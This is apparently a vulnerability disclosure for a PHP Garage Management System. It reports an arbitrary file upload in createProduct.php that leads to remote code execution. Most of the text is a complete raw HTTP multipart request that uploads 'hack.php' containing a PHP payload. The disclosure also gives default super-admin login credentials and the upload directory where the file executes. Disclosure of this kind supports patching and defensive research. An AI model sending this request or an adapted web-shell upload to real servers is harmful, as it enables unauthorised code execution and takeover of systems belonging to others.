# Garage Management System v1.0 by mayuri_k has arbitrary code execution (RCE)

BUG_Author: Hackerwang

vendors: https://www.sourcecodester.com/php/15485/garage-management-system-using-phpmysql-source-code.html

The program is built using the xmapp-php8.1 version

Login account: mayuri.infospace@gmail.com/rootadmin (Super Admin account)

Vulnerability url: ip/garage/php_action/createProduct.php

Loophole location: arbitrary file upload exists in Garage Management System's createProduct.php file (RCE).

Request package for file upload：

```sql
POST /garage/php_action/createProduct.php HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://192.168.1.19/garage/add-product.php
Cookie: _ga=GA1.1.1382961971.1655097107; PHPSESSID=m6rramo7f8jalaggbvjh84b1mm
Connection: close
Content-Type: multipart/form-data; boundary=---------------------------303732607214905
Content-Length: 1062

-----------------------------303732607214905
Content-Disposition: form-data; name="currnt_date"


-----------------------------303732607214905
Content-Disposition: form-data; name="productImage"; filename="hack.php"
Content-Type: application/octet-stream

JFJF
<?php phpinfo();?>
-----------------------------303732607214905
Content-Disposition: form-data; name="productName"

hello
-----------------------------303732607214905
Content-Disposition: form-data; name="quantity"

1111111
-----------------------------303732607214905
Content-Disposition: form-data; name="rate"

11111111
-----------------------------303732607214905
Content-Disposition: form-data; name="brandName"

1
-----------------------------303732607214905
Content-Disposition: form-data; name="categoryName"

5
-----------------------------303732607214905
Content-Disposition: form-data; name="productStatus"

2
-----------------------------303732607214905
Content-Disposition: form-data; name="create"


-----------------------------303732607214905--
```

The files will be uploaded to this directory \garage\assets\myimages

![image](https://user-images.githubusercontent.com/54017627/180589915-b461ed9a-2b50-41a6-853a-3a4b58924ef2.png)

We visited the directory of the file in the browser and found that the code had been executed

![image](https://user-images.githubusercontent.com/54017627/180589928-1ec1654b-ec62-4f61-aa27-eeb9fa115e51.png)

